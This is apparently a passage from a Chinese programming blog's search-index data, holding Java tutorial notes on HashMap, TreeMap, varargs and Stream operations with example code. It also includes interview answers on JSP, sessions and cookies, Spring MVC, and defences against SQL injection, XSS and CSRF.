代码实现 学生类 public class Student { private String name; private int age; public Student() { } public Student(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } @Override public boolean equals(Object o) { if (this == o) return true; if (o == null || getClass() != o.getClass()) return false; Student student = (Student) o; if (age != student.age) return false; return name != null ? name.equals(student.name) : student.name == null; } @Override public int hashCode() { int result = name != null ? name.hashCode() : 0; result = 31 * result + age; return result; } } 测试类 public class HashMapDemo { public static void main(String[] args) { //创建HashMap集合对象 HashMap\u003cStudent, String\u003e hm = new HashMap\u003cStudent, String\u003e(); //创建学生对象 Student s1 = new Student(\"林青霞\", 30); Student s2 = new Student(\"张曼玉\", 35); Student s3 = new Student(\"王祖贤\", 33); Student s4 = new Student(\"王祖贤\", 33); //把学生添加到集合 hm.put(s1, \"西安\"); hm.put(s2, \"武汉\"); hm.put(s3, \"郑州\"); hm.put(s4, \"北京\"); //遍历集合 Set\u003cStudent\u003e keySet = hm.keySet(); for (Student key : keySet) { String value = hm.get(key); System.out.println(key.getName() + \",\" + key.getAge() + \",\" + value); } } } ","date":"2021-07-21","objectID":"/posts/collection-03/:4:2","tags":[],"title":"Collection -03","uri":"/posts/collection-03/"},{"categories":["大三下实训笔记"],"content":"5.TreeMap集合 ","date":"2021-07-21","objectID":"/posts/collection-03/:5:0","tags":[],"title":"Collection -03","uri":"/posts/collection-03/"},{"categories":["大三下实训笔记"],"content":"5.1TreeMap集合概述和特点【理解】 TreeMap底层是红黑树结构 依赖自然排序或者比较器排序,对键进行排序 如果键存储的是自定义对象,需要实现Comparable接口或者在创建TreeMap对象时候给出比较器排序规则 ","date":"2021-07-21","objectID":"/posts/collection-03/:5:1","tags":[],"title":"Collection -03","uri":"/posts/collection-03/"},{"categories":["大三下实训笔记"],"content":"5.2TreeMap集合应用案例【应用】 案例需求 创建一个TreeMap集合,键是学生对象(Student),值是籍贯(String),学生属性姓名和年龄,按照年龄进行排序并遍历 要求按照学生的年龄进行排序,如果年龄相同则按照姓名进行排序 代码实现 学生类 public class Student implements Comparable\u003cStudent\u003e{ private String name; private int age; public Student() { } public Student(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } @Override public String toString() { return \"Student{\" + \"name='\" + name + '\\'' + \", age=\" + age + '}'; } @Override public int compareTo(Student o) { //按照年龄进行排序 int result = o.getAge() - this.getAge(); //次要条件，按照姓名排序。 result = result == 0 ? o.getName().compareTo(this.getName()) : result; return result; } } 测试类 public class Test1 { public static void main(String[] args) { // 创建TreeMap集合对象 TreeMap\u003cStudent,String\u003e tm = new TreeMap\u003c\u003e(); // 创建学生对象 Student s1 = new Student(\"xiaohei\",23); Student s2 = new Student(\"dapang\",22); Student s3 = new Student(\"xiaomei\",22); // 将学生对象添加到TreeMap集合中 tm.put(s1,\"江苏\"); tm.put(s2,\"北京\"); tm.put(s3,\"天津\"); // 遍历TreeMap集合,打印每个学生的信息 tm.forEach( (Student key, String value)-\u003e{ System.out.println(key + \"---\" + value); } ); } } ","date":"2021-07-21","objectID":"/posts/collection-03/:5:2","tags":[],"title":"Collection -03","uri":"/posts/collection-03/"},{"categories":["大三下实训笔记"],"content":"可变参数-Stream流","date":"2021-07-21","objectID":"/posts/collection-04/","tags":[],"title":"Collection -04","uri":"/posts/collection-04/"},{"categories":["大三下实训笔记"],"content":"1.可变参数 ","date":"2021-07-21","objectID":"/posts/collection-04/:1:0","tags":[],"title":"Collection -04","uri":"/posts/collection-04/"},{"categories":["大三下实训笔记"],"content":"1.1可变参数【应用】 可变参数介绍 可变参数又称参数个数可变，用作方法的形参出现，那么方法参数个数就是可变的了 方法的参数类型已经确定,个数不确定,我们可以使用可变参数 可变参数定义格式 修饰符 返回值类型 方法名(数据类型… 变量名) { } 可变参数的注意事项 这里的变量其实是一个数组 如果一个方法有多个参数，包含可变参数，可变参数要放在最后 可变参数的基本使用 public class ArgsDemo01 { public static void main(String[] args) { System.out.println(sum(10, 20)); System.out.println(sum(10, 20, 30)); System.out.println(sum(10, 20, 30, 40)); System.out.println(sum(10,20,30,40,50)); System.out.println(sum(10,20,30,40,50,60)); System.out.println(sum(10,20,30,40,50,60,70)); System.out.println(sum(10,20,30,40,50,60,70,80,90,100)); } // public static int sum(int b,int... a) { // return 0; // } public static int sum(int... a) { int sum = 0; for(int i : a) { sum += i; } return sum; } } ","date":"2021-07-21","objectID":"/posts/collection-04/:1:1","tags":[],"title":"Collection -04","uri":"/posts/collection-04/"},{"categories":["大三下实训笔记"],"content":"1.2创建不可变集合【理解】 方法介绍 在List、Set、Map接口中,都存在of方法,可以创建一个不可变的集合 这个集合不能添加,不能删除,不能修改 但是可以结合集合的带参构造,实现集合的批量添加 在Map接口中,还有一个ofEntries方法可以提高代码的阅读性 首先会把键值对封装成一个Entry对象,再把这个Entry对象添加到集合当中 示例代码 public class MyVariableParameter4 { public static void main(String[] args) { // static \u003cE\u003e List\u003cE\u003e of(E…elements) 创建一个具有指定元素的List集合对象 //static \u003cE\u003e Set\u003cE\u003e of(E…elements) 创建一个具有指定元素的Set集合对象 //static \u003cK , V\u003e Map\u003cK，V\u003e of(E…elements) 创建一个具有指定元素的Map集合对象 //method1(); //method2(); //method3(); //method4(); } private static void method4() { Map\u003cString, String\u003e map = Map.ofEntries( Map.entry(\"zhangsan\", \"江苏\"), Map.entry(\"lisi\", \"北京\")); System.out.println(map); } private static void method3() { Map\u003cString, String\u003e map = Map.of(\"zhangsan\", \"江苏\", \"lisi\", \"北京\", \"wangwu\", \"天津\"); System.out.println(map); } private static void method2() { //传递的参数当中，不能存在重复的元素。 Set\u003cString\u003e set = Set.of(\"a\", \"b\", \"c\", \"d\",\"a\"); System.out.println(set); } private static void method1() { List\u003cString\u003e list = List.of(\"a\", \"b\", \"c\", \"d\"); System.out.println(list); //list.add(\"Q\"); //list.remove(\"a\"); //list.set(0,\"A\"); //System.out.println(list); // ArrayList\u003cString\u003e list2 = new ArrayList\u003c\u003e(); // list2.add(\"aaa\"); // list2.add(\"aaa\"); // list2.add(\"aaa\"); // list2.add(\"aaa\"); //集合的批量添加。 //首先是通过调用List.of方法来创建一个不可变的集合，of方法的形参就是一个可变参数。 //再创建一个ArrayList集合，并把这个不可变的集合中所有的数据，都添加到ArrayList中。 ArrayList\u003cString\u003e list3 = new ArrayList\u003c\u003e(List.of(\"a\", \"b\", \"c\", \"d\")); System.out.println(list3); } } ","date":"2021-07-21","objectID":"/posts/collection-04/:1:2","tags":[],"title":"Collection -04","uri":"/posts/collection-04/"},{"categories":["大三下实训笔记"],"content":"2.Stream流 ","date":"2021-07-21","objectID":"/posts/collection-04/:2:0","tags":[],"title":"Collection -04","uri":"/posts/collection-04/"},{"categories":["大三下实训笔记"],"content":"2.1体验Stream流【理解】 案例需求 按照下面的要求完成集合的创建和遍历 创建一个集合，存储多个字符串元素 把集合中所有以\"张\"开头的元素存储到一个新的集合 把\"张\"开头的集合中的长度为3的元素存储到一个新的集合 遍历上一步得到的集合 原始方式示例代码 public class MyStream1 { public static void main(String[] args) { //集合的批量添加 ArrayList\u003cString\u003e list1 = new ArrayList\u003c\u003e(List.of(\"张三丰\",\"张无忌\",\"张翠山\",\"王二麻子\",\"张良\",\"谢广坤\")); //list.add() //遍历list1把以张开头的元素添加到list2中。 ArrayList\u003cString\u003e list2 = new ArrayList\u003c\u003e(); for (String s : list1) { if(s.startsWith(\"张\")){ list2.add(s); } } //遍历list2集合，把其中长度为3的元素，再添加到list3中。 ArrayList\u003cString\u003e list3 = new ArrayList\u003c\u003e(); for (String s : list2) { if(s.length() == 3){ list3.add(s); } } for (String s : list3) { System.out.println(s); } } } 使用Stream流示例代码 public class StreamDemo { public static void main(String[] args) { //集合的批量添加 ArrayList\u003cString\u003e list1 = new ArrayList\u003c\u003e(List.of(\"张三丰\",\"张无忌\",\"张翠山\",\"王二麻子\",\"张良\",\"谢广坤\")); //Stream流 list1.stream().filter(s-\u003es.startsWith(\"张\")) .filter(s-\u003es.length() == 3) .forEach(s-\u003e System.out.println(s)); } } Stream流的好处 直接阅读代码的字面意思即可完美展示无关逻辑方式的语义：获取流、过滤姓张、过滤长度为3、逐一打印 Stream流把真正的函数式编程风格引入到Java中 代码简洁 ","date":"2021-07-21","objectID":"/posts/collection-04/:2:1","tags":[],"title":"Collection -04","uri":"/posts/collection-04/"},{"categories":["大三下实训笔记"],"content":"2.2Stream流的常见生成方式【应用】 Stream流的思想 Stream流的三类方法 获取Stream流 创建一条流水线,并把数据放到流水线上准备进行操作 中间方法 流水线上的操作 一次操作完毕之后,还可以继续进行其他操作 终结方法 一个Stream流只能有一个终结方法 是流水线上的最后一个操作 生成Stream流的方式 Collection体系集合 使用默认方法stream()生成流， default Stream stream() Map体系集合 把Map转成Set集合，间接的生成流 数组 通过Arrays中的静态方法stream生成流 同种数据类型的多个数据 通过Stream接口的静态方法of(T… values)生成流 代码演示 public class StreamDemo { public static void main(String[] args) { //Collection体系的集合可以使用默认方法stream()生成流 List\u003cString\u003e list = new ArrayList\u003cString\u003e(); Stream\u003cString\u003e listStream = list.stream(); Set\u003cString\u003e set = new HashSet\u003cString\u003e(); Stream\u003cString\u003e setStream = set.stream(); //Map体系的集合间接的生成流 Map\u003cString,Integer\u003e map = new HashMap\u003cString, Integer\u003e(); Stream\u003cString\u003e keyStream = map.keySet().stream(); Stream\u003cInteger\u003e valueStream = map.values().stream(); Stream\u003cMap.Entry\u003cString, Integer\u003e\u003e entryStream = map.entrySet().stream(); //数组可以通过Arrays中的静态方法stream生成流 String[] strArray = {\"hello\",\"world\",\"java\"}; Stream\u003cString\u003e strArrayStream = Arrays.stream(strArray); //同种数据类型的多个数据可以通过Stream接口的静态方法of(T... values)生成流 Stream\u003cString\u003e strArrayStream2 = Stream.of(\"hello\", \"world\", \"java\"); Stream\u003cInteger\u003e intStream = Stream.of(10, 20, 30); } } ","date":"2021-07-21","objectID":"/posts/collection-04/:2:2","tags":[],"title":"Collection -04","uri":"/posts/collection-04/"},{"categories":["大三下实训笔记"],"content":"2.3Stream流中间操作方法【应用】 概念 中间操作的意思是,执行完此方法之后,Stream流依然可以继续执行其他操作 常见方法 方法名 说明 Stream filter(Predicate predicate) 用于对流中的数据进行过滤 Stream limit(long maxSize) 返回此流中的元素组成的流，截取前指定参数个数的数据 Stream skip(long n) 跳过指定参数个数的数据，返回由该流的剩余元素组成的流 static Stream concat(Stream a, Stream b) 合并a和b两个流为一个流 Stream distinct() 返回由该流的不同元素（根据Object.equals(Object) ）组成的流 filter代码演示 public class MyStream3 { public static void main(String[] args) { // Stream\u003cT\u003e filter(Predicate predicate)：过滤 // Predicate接口中的方法 boolean test(T t)：对给定的参数进行判断，返回一个布尔值 ArrayList\u003cString\u003e list = new ArrayList\u003c\u003e(); list.add(\"张三丰\"); list.add(\"张无忌\"); list.add(\"张翠山\"); list.add(\"王二麻子\"); list.add(\"张良\"); list.add(\"谢广坤\"); //filter方法获取流中的 每一个数据. //而test方法中的s,就依次表示流中的每一个数据. //我们只要在test方法中对s进行判断就可以了. //如果判断的结果为true,则当前的数据留下 //如果判断的结果为false,则当前数据就不要. // list.stream().filter( // new Predicate\u003cString\u003e() { // @Override // public boolean test(String s) { // boolean result = s.startsWith(\"张\"); // return result; // } // } // ).forEach(s-\u003e System.out.println(s)); //因为Predicate接口中只有一个抽象方法test //所以我们可以使用lambda表达式来简化 // list.stream().filter( // (String s)-\u003e{ // boolean result = s.startsWith(\"张\"); // return result; // } // ).forEach(s-\u003e System.out.println(s)); list.stream().filter(s -\u003es.startsWith(\"张\")).forEach(s-\u003e System.out.println(s)); } } limit\u0026skip代码演示 public class StreamDemo02 { public static void main(String[] args) { //创建一个集合，存储多个字符串元素 ArrayList\u003cString\u003e list = new ArrayList\u003cString\u003e(); list.add(\"林青霞\"); list.add(\"张曼玉\"); list.add(\"王祖贤\"); list.add(\"柳岩\"); list.add(\"张敏\"); list.add(\"张无忌\"); //需求1：取前3个数据在控制台输出 list.stream().limit(3).forEach(s-\u003e System.out.println(s)); System.out.println(\"--------\"); //需求2：跳过3个元素，把剩下的元素在控制台输出 list.stream().skip(3).forEach(s-\u003e System.out.println(s)); System.out.println(\"--------\"); //需求3：跳过2个元素，把剩下的元素中前2个在控制台输出 list.stream().skip(2).limit(2).forEach(s-\u003e System.out.println(s)); } } concat\u0026distinct代码演示 public class StreamDemo03 { public static void main(String[] args) { //创建一个集合，存储多个字符串元素 ArrayList\u003cString\u003e list = new ArrayLi","date":"2021-07-21","objectID":"/posts/collection-04/:2:3","tags":[],"title":"Collection -04","uri":"/posts/collection-04/"},{"categories":["大三下实训笔记"],"content":"2.4Stream流终结操作方法【应用】 概念 终结操作的意思是,执行完此方法之后,Stream流将不能再执行其他操作 常见方法 方法名 说明 void forEach(Consumer action) 对此流的每个元素执行操作 long count() 返回此流中的元素数 代码演示 public class MyStream5 { public static void main(String[] args) { ArrayList\u003cString\u003e list = new ArrayList\u003c\u003e(); list.add(\"张三丰\"); list.add(\"张无忌\"); list.add(\"张翠山\"); list.add(\"王二麻子\"); list.add(\"张良\"); list.add(\"谢广坤\"); //method1(list); // long count()：返回此流中的元素数 long count = list.stream().count(); System.out.println(count); } private static void method1(ArrayList\u003cString\u003e list) { // void forEach(Consumer action)：对此流的每个元素执行操作 // Consumer接口中的方法void accept(T t)：对给定的参数执行此操作 //在forEach方法的底层,会循环获取到流中的每一个数据. //并循环调用accept方法,并把每一个数据传递给accept方法 //s就依次表示了流中的每一个数据. //所以,我们只要在accept方法中,写上处理的业务逻辑就可以了. list.stream().forEach( new Consumer\u003cString\u003e() { @Override public void accept(String s) { System.out.println(s); } } ); System.out.println(\"====================\"); //lambda表达式的简化格式 //是因为Consumer接口中,只有一个accept方法 list.stream().forEach( (String s)-\u003e{ System.out.println(s); } ); System.out.println(\"====================\"); //lambda表达式还是可以进一步简化的. list.stream().forEach(s-\u003eSystem.out.println(s)); } } ","date":"2021-07-21","objectID":"/posts/collection-04/:2:4","tags":[],"title":"Collection -04","uri":"/posts/collection-04/"},{"categories":["大三下实训笔记"],"content":"2.5Stream流的收集操作【应用】 概念 对数据使用Stream流的方式操作完毕后,可以把流中的数据收集到集合中 常用方法 方法名 说明 R collect(Collector collector) 把结果收集到集合中 工具类Collectors提供了具体的收集方式 方法名 说明 public static Collector toList() 把元素收集到List集合中 public static Collector toSet() 把元素收集到Set集合中 public static Collector toMap(Function keyMapper,Function valueMapper) 把元素收集到Map集合中 代码演示 // toList和toSet方法演示 public class MyStream7 { public static void main(String[] args) { ArrayList\u003cInteger\u003e list1 = new ArrayList\u003c\u003e(); for (int i = 1; i \u003c= 10; i++) { list1.add(i); } list1.add(10); list1.add(10); list1.add(10); list1.add(10); list1.add(10); //filter负责过滤数据的. //collect负责收集数据. //获取流中剩余的数据,但是他不负责创建容器,也不负责把数据添加到容器中. //Collectors.toList() : 在底层会创建一个List集合.并把所有的数据添加到List集合中. List\u003cInteger\u003e list = list1.stream().filter(number -\u003e number % 2 == 0) .collect(Collectors.toList()); System.out.println(list); Set\u003cInteger\u003e set = list1.stream().filter(number -\u003e number % 2 == 0) .collect(Collectors.toSet()); System.out.println(set); } } /** Stream流的收集方法 toMap方法演示 创建一个ArrayList集合，并添加以下字符串。字符串中前面是姓名，后面是年龄 \"zhangsan,23\" \"lisi,24\" \"wangwu,25\" 保留年龄大于等于24岁的人，并将结果收集到Map集合中，姓名为键，年龄为值 */ public class MyStream8 { public static void main(String[] args) { ArrayList\u003cString\u003e list = new ArrayList\u003c\u003e(); list.add(\"zhangsan,23\"); list.add(\"lisi,24\"); list.add(\"wangwu,25\"); Map\u003cString, Integer\u003e map = list.stream().filter( s -\u003e { String[] split = s.split(\",\"); int age = Integer.parseInt(split[1]); return age \u003e= 24; } // collect方法只能获取到流中剩余的每一个数据. //在底层不能创建容器,也不能把数据添加到容器当中 //Collectors.toMap 创建一个map集合并将数据添加到集合当中 // s 依次表示流中的每一个数据 //第一个lambda表达式就是如何获取到Map中的键 //第二个lambda表达式就是如何获取Map中的值 ).collect(Collectors.toMap( s -\u003e s.split(\",\")[0], s -\u003e Integer.parseInt(s.split(\",\")[1]) )); System.out.println(map); } } ","date":"2021-07-21","objectID":"/posts/collection-04/:2:5","tags":[],"title":"Collection -04","uri":"/posts/collection-04/"},{"categories":["大三下实训笔记"],"content":"2.6Stream流综合练习【应用】 案例需求 现在有两个ArrayList集合，分别存储6名男演员名称和6名女演员名称，要求完成如下的操作 男演员只要名字为3个字的前三人 女演员只要姓林的，并且不要第一个 把过滤后的男演员姓名和女演员姓名合并到一起 把上一步操作后的元素作为构造方法的参数创建演员对象,遍历数据 演员类Actor已经提供，里面有一个成员变量，一个带参构造方法，以及成员变量对应的get/set方法 代码实现 演员类 public class Actor { private String name; public Actor(String name) { this.name = name; } public String getName() { return name; } public void setName(String name) { this.name = name; } } 测试类 public class StreamTest { public static void main(String[] args) { //创建集合 ArrayList\u003cString\u003e manList = new ArrayList\u003cString\u003e(); manList.add(\"周润发\"); manList.add(\"成龙\"); manList.add(\"刘德华\"); manList.add(\"吴京\"); manList.add(\"周星驰\"); manList.add(\"李连杰\"); ArrayList\u003cString\u003e womanList = new ArrayList\u003cString\u003e(); womanList.add(\"林心如\"); womanList.add(\"张曼玉\"); womanList.add(\"林青霞\"); womanList.add(\"柳岩\"); womanList.add(\"林志玲\"); womanList.add(\"王祖贤\"); //男演员只要名字为3个字的前三人 Stream\u003cString\u003e manStream = manList.stream().filter(s -\u003e s.length() == 3).limit(3); //女演员只要姓林的，并且不要第一个 Stream\u003cString\u003e womanStream = womanList.stream().filter(s -\u003e s.startsWith(\"林\")).skip(1); //把过滤后的男演员姓名和女演员姓名合并到一起 Stream\u003cString\u003e stream = Stream.concat(manStream, womanStream); // 将流中的数据封装成Actor对象之后打印 stream.forEach(name -\u003e { Actor actor = new Actor(name); System.out.println(actor); }); } } ","date":"2021-07-21","objectID":"/posts/collection-04/:2:6","tags":[],"title":"Collection -04","uri":"/posts/collection-04/"},{"categories":["java面试"],"content":" 本文由 简悦 SimpRead 转码， 原文地址 blog.csdn.net ","date":"2021-07-19","objectID":"/posts/javaweb-%E5%85%AD/:0:0","tags":["JavaWeb"],"title":"javaWeb 六","uri":"/posts/javaweb-%E5%85%AD/"},{"categories":["java面试"],"content":"Java 208 道面试题 · Java Web ","date":"2021-07-19","objectID":"/posts/javaweb-%E5%85%AD/:1:0","tags":["JavaWeb"],"title":"javaWeb 六","uri":"/posts/javaweb-%E5%85%AD/"},{"categories":["java面试"],"content":"64. jsp 和 servlet 有什么区别？ jsp经编译后就变成了Servlet.（JSP的本质就是Servlet，JVM只能识别java的类，不能识别JSP的代码，Web容器将JSP的代码编译成JVM能够识别的java类） jsp更擅长表现于页面显示，servlet更擅长于逻辑控制。 Servlet中没有内置对象，Jsp中的内置对象都是必须通过HttpServletRequest对象，HttpServletResponse对象以及HttpServlet对象得到。 Jsp是Servlet的一种简化，使用Jsp只需要完成程序员需要输出到客户端的内容，Jsp中的Java脚本如何镶嵌到一个类中，由Jsp容器完成。而Servlet则是个完整的Java类，这个类的Service方法用于生成对客户端的响应。 ","date":"2021-07-19","objectID":"/posts/javaweb-%E5%85%AD/:1:1","tags":["JavaWeb"],"title":"javaWeb 六","uri":"/posts/javaweb-%E5%85%AD/"},{"categories":["java面试"],"content":"65. jsp 有哪些内置对象？作用分别是什么？ JSP有9个内置对象： request：封装客户端的请求，其中包含来自GET或POST请求的参数； response：封装服务器对客户端的响应； pageContext：通过该对象可以获取其他对象； session：封装用户会话的对象； application：封装服务器运行环境的对象； out：输出服务器响应的输出流对象； config：Web应用的配置对象； page：JSP页面本身（相当于Java程序中的this）； exception：封装页面抛出异常的对象。 ","date":"2021-07-19","objectID":"/posts/javaweb-%E5%85%AD/:1:2","tags":["JavaWeb"],"title":"javaWeb 六","uri":"/posts/javaweb-%E5%85%AD/"},{"categories":["java面试"],"content":"66. 说一下 jsp 的 4 种作用域？ JSP中的四种作用域包括page、request、session和application，具体来说： page代表与一个页面相关的对象和属性。 request代表与Web客户机发出的一个请求相关的对象和属性。一个请求可能跨越多个页面，涉及多个Web组件；需要在页面显示的临时数据可以置于此作用域。 session代表与某个用户与服务器建立的一次会话相关的对象和属性。跟某个用户相关的数据应该放在用户自己的session中。 application代表与整个Web应用程序相关的对象和属性，它实质上是跨越整个Web应用程序，包括多个页面、请求和会话的一个全局作用域。 ","date":"2021-07-19","objectID":"/posts/javaweb-%E5%85%AD/:1:3","tags":["JavaWeb"],"title":"javaWeb 六","uri":"/posts/javaweb-%E5%85%AD/"},{"categories":["java面试"],"content":"67. session 和 cookie 有什么区别？ 由于HTTP协议是无状态的协议，所以服务端需要记录用户的状态时，就需要用某种机制来识具体的用户，这个机制就是Session.典型的场景比如购物车，当你点击下单按钮时，由于HTTP协议无状态，所以并不知道是哪个用户操作的，所以服务端要为特定的用户创建了特定的Session，用用于标识这个用户，并且跟踪用户，这样才知道购物车里面有几本书。这个Session是保存在服务端的，有一个唯一标识。在服务端保存Session的方法很多，内存、数据库、文件都有。集群的时候也要考虑Session的转移，在大型的网站，一般会有专门的Session服务器集群，用来保存用户会话，这个时候 Session 信息都是放在内存的，使用一些缓存服务比如Memcached之类的来放 Session。 思考一下服务端如何识别特定的客户？这个时候Cookie就登场了。每次HTTP请求的时候，客户端都会发送相应的Cookie信息到服务端。实际上大多数的应用都是用 Cookie 来实现Session跟踪的，第一次创建Session的时候，服务端会在HTTP协议中告诉客户端，需要在 Cookie 里面记录一个Session ID，以后每次请求把这个会话ID发送到服务器，我就知道你是谁了。有人问，如果客户端的浏览器禁用了 Cookie 怎么办？一般这种情况下，会使用一种叫做URL重写的技术来进行会话跟踪，即每次HTTP交互，URL后面都会被附加上一个诸如 sid=xxxxx 这样的参数，服务端据此来识别用户。 Cookie其实还可以用在一些方便用户的场景下，设想你某次登陆过一个网站，下次登录的时候不想再次输入账号了，怎么办？这个信息可以写到Cookie里面，访问网站的时候，网站页面的脚本可以读取这个信息，就自动帮你把用户名给填了，能够方便一下用户。这也是Cookie名称的由来，给用户的一点甜头。所以，总结一下：Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中；Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是实现Session的一种方式。 ","date":"2021-07-19","objectID":"/posts/javaweb-%E5%85%AD/:1:4","tags":["JavaWeb"],"title":"javaWeb 六","uri":"/posts/javaweb-%E5%85%AD/"},{"categories":["java面试"],"content":"68. 说一下 session 的工作原理？ 其实session是一个存在服务器上的类似于一个散列表格的文件。里面存有我们需要的信息，在我们需要用的时候可以从里面取出来。类似于一个大号的map吧，里面的键存储的是用户的sessionid，用户向服务器发送请求的时候会带上这个sessionid。这时就可以从中取出对应的值了。 ","date":"2021-07-19","objectID":"/posts/javaweb-%E5%85%AD/:1:5","tags":["JavaWeb"],"title":"javaWeb 六","uri":"/posts/javaweb-%E5%85%AD/"},{"categories":["java面试"],"content":"69. 如果客户端禁止 cookie 能实现 session 还能用吗？ Cookie与 Session，一般认为是两个独立的东西，Session采用的是在服务器端保持状态的方案，而Cookie采用的是在客户端保持状态的方案。但为什么禁用Cookie就不能得到Session呢？因为Session是用Session ID来确定当前对话所对应的服务器Session，而Session ID是通过Cookie来传递的，禁用Cookie相当于失去了Session ID，也就得不到Session了。 假定用户关闭Cookie的情况下使用Session，其实现途径有以下几种： 设置php.ini配置文件中的“session.use_trans_sid = 1”，或者编译时打开打开了“–enable-trans-sid”选项，让PHP自动跨页传递Session ID。 手动通过URL传值、隐藏表单传递Session ID。 用文件、数据库等形式保存Session ID，在跨页过程中手动调用。 ","date":"2021-07-19","objectID":"/posts/javaweb-%E5%85%AD/:1:6","tags":["JavaWeb"],"title":"javaWeb 六","uri":"/posts/javaweb-%E5%85%AD/"},{"categories":["java面试"],"content":"70. spring mvc 和 struts 的区别是什么？ 拦截机制的不同 Struts2是类级别的拦截，每次请求就会创建一个Action，和Spring整合时Struts2的ActionBean注入作用域是原型模式prototype，然后通过setter，getter吧request数据注入到属性。Struts2中，一个Action对应一个request，response上下文，在接收参数时，可以通过属性接收，这说明属性参数是让多个方法共享的。Struts2中Action的一个方法可以对应一个url，而其类属性却被所有方法共享，这也就无法用注解或其他方式标识其所属方法了，只能设计为多例。 SpringMVC是方法级别的拦截，一个方法对应一个Request上下文，所以方法直接基本上是独立的，独享request，response数据。而每个方法同时又何一个url对应，参数的传递是直接注入到方法中的，是方法所独有的。处理结果通过ModeMap返回给框架。在Spring整合时，SpringMVC的Controller Bean默认单例模式Singleton，所以默认对所有的请求，只会创建一个Controller，有应为没有共享的属性，所以是线程安全的，如果要改变默认的作用域，需要添加@Scope注解修改。 Struts2有自己的拦截Interceptor机制，SpringMVC这是用的是独立的Aop方式，这样导致Struts2的配置文件量还是比SpringMVC大。 底层框架的不同 Struts2采用Filter（StrutsPrepareAndExecuteFilter）实现，SpringMVC（DispatcherServlet）则采用Servlet实现。Filter在容器启动之后即初始化；服务停止以后坠毁，晚于Servlet。Servlet在是在调用时初始化，先于Filter调用，服务停止后销毁。 性能方面 Struts2是类级别的拦截，每次请求对应实例一个新的Action，需要加载所有的属性值注入，SpringMVC实现了零配置，由于SpringMVC基于方法的拦截，有加载一次单例模式bean注入。所以，SpringMVC开发效率和性能高于Struts2。 配置方面 spring MVC和Spring是无缝的。从这个项目的管理和安全上也比Struts2高。 ","date":"2021-07-19","objectID":"/posts/javaweb-%E5%85%AD/:1:7","tags":["JavaWeb"],"title":"javaWeb 六","uri":"/posts/javaweb-%E5%85%AD/"},{"categories":["java面试"],"content":"71. 如何避免 sql 注入？ PreparedStatement（简单又有效的方法） 使用正则表达式过滤传入的参数 字符串过滤 JSP中调用该函数检查是否包函非法字符 JSP页面判断代码 ","date":"2021-07-19","objectID":"/posts/javaweb-%E5%85%AD/:1:8","tags":["JavaWeb"],"title":"javaWeb 六","uri":"/posts/javaweb-%E5%85%AD/"},{"categories":["java面试"],"content":"72. 什么是 XSS 攻击，如何避免？ XSS攻击又称CSS,全称Cross Site Script （跨站脚本攻击），其原理是攻击者向有XSS漏洞的网站中输入恶意的 HTML 代码，当用户浏览该网站时，这段 HTML 代码会自动执行，从而达到攻击的目的。XSS 攻击类似于 SQL 注入攻击，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而在xss攻击中，通过插入恶意脚本，实现对用户游览器的控制，获取用户的一些信息。 XSS是 Web 程序中常见的漏洞，XSS 属于被动式且用于客户端的攻击方式。 XSS防范的总体思路是：对输入(和URL参数)进行过滤，对输出进行编码。 ","date":"2021-07-19","objectID":"/posts/javaweb-%E5%85%AD/:1:9","tags":["JavaWeb"],"title":"javaWeb 六","uri":"/posts/javaweb-%E5%85%AD/"},{"categories":["java面试"],"content":"73. 什么是 CSRF 攻击，如何避免？ CSRF（Cross-site request forgery）也被称为 one-click attack或者 session riding，中文全称是叫跨站请求伪造。一般来说，攻击者通过伪造用户的浏览器的请求，向访问一个用户自己曾经认证访问过的网站发送出去，使目标网站接收并误以为是用户的真实操作而去执行命令。常用于盗取账号、转账、发送虚假消息等。攻击者利用网站对请求的验证漏洞而实现这样的攻击行为，网站能够确认请求来源于用户的浏览器，却不能验证请求是否源于用户的真实意愿下的操作行为。 如何避免： 1. 验证 HTTP Referer 字段 HTTP头中的Referer字段记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，而如果黑客要对其实施 CSRF 攻击，他一般只能在他自己的网站构造请求。因此，可以通过验证Referer值来防御CSRF 攻击。 2. 使用验证码 关键操作页面加上验证码，后台收到请求后通过判断验证码可以防御CSRF。但这种方法对用户不太友好。 3. 在请求地址中添加token并验证 CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于cookie中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有token或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于session之中，然后在每次请求时把token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。 对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 http://url?csrftoken=tokenvalue。 而对于 POST 请求来说，要在 form 的最后加上 ，这样就把token以参数的形式加入请求了。 4. 在HTTP 头中自定义属性并验证 这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。 原文地址：https://blog.csdn.net/sufu1065/article/details/88051083 ","date":"2021-07-19","objectID":"/posts/javaweb-%E5%85%AD/:1:10","tags":["JavaWeb"],"title":"javaWeb 六","uri":"/posts/javaweb-%E5%85%AD/"},{"categories":["java面试"],"content":" 本文由 简悦 SimpRead 转码， 原文地址 blog.csdn.net ","date":"2021-07-19","objectID":"/posts/java%E5%9F%BA%E7%A1%80-%E4%B8%80/:0:0","tags":[],"title":"Java基础 